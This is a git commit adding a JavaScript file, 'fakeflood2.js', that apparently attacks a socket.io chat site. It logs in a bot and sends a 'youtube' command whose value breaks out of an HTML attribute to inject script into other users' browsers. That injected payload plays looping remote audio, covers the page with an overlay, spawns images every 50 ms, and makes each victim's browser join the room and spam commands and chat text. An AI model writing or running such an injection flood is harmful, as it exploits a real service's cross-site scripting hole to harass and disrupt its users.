8c5588523bcb8460e484b934014ece6f3278c425
bwcrackedalt <galletamaria9081@gmail.com>
2026-05-30 09:52:25 -0500

    Create fakeflood2.js

---
+++ fakeflood2.js
@@ -0,0 +1,54 @@
+const socket = io(window.location.href);
+socket.emit('login', {name: "utubesyryou"});
+setTimeout(()=>{
+socket.emit('command', {list: ["color", "yellow"]});
+socket.emit('talk', {text: "hello"});
+},1000);
+setTimeout(()=>{
+  socket.emit('command', {list: ["color", "losky"]});
+socket.emit('command', {list: ["name", "DOOM"]});
+},5000);
+setTimeout(()=>{
+socket.emit('command', {
+  list: [
+    'youtube',
+    `eee" onload="
+const socket = io(window.location.href);
+socket.emit('login', {name: '...'});
+setTimeout(()=>{
+socket.emit('command', {list: ['color']});
+}, 10);
+const audio = new Audio('https://files.catbox.moe/upks3d.mp3');
+audio.loop = true;
+audio.play();
+const background = document.createElement('div');
+
+background.style.position = 'fixed';
+background.style.top = '0';
+background.style.left = '0';
+
+background.style.width = '3000vw';
+background.style.height = '3000vh';
+
+background.style.backgroundColor = '#6d33a0';
+background.style.zIndex = '999';
+
+document.body.appendChild(background);
+setInterval(function(){
+const img = document.createElement('img');
+
+img.src = 'https://files.catbox.moe/c0p9cs.png';
+img.style.position = 'absolute';
+img.style.top = Math.floor(Math.random()*window.innerHeight) + 'px';
+img.style.left = Math.floor(Math.random()*window.innerWidth) + 'px';
+img.style.zIndex = '9999';
+
+document.body.appendChild(img);
+socket.emit('command', {list: ['speed', Math.floor(Math.random()*275)]});
+socket.emit('command', {list: ['pitch', Math.floor(Math.random()*125)]});
+socket.emit('talk', {text: 'WhatYouKnowAboutRollingDownInTheDeepWhenYourBrainGoesNumbYouCanCallThatMentalFreezeWhenThesePeopleTalkTooMuchPutThatShitInSlowMotionYeahIFeelLikeAnAstronautInTheOceanAyyWhatYouKnowAboutRollingDownInTheDeepWhenYourBrainGoesNumbYouCanCallThatMentalFreezeWhenThesePeopleTalkTooMuchPutThatShitInSlowMotionYeahIFeelLikeAnAstronautInTheOceanSheSayThatImCoolImLikeYeahThatsTrueIBelieveInGODDontBelieveInTHOTSheKeepPlayingMeDumbImaPlayHerForFunYallDontReally'});
+}, 50);
+"`
+  ]
+});
+},6000);
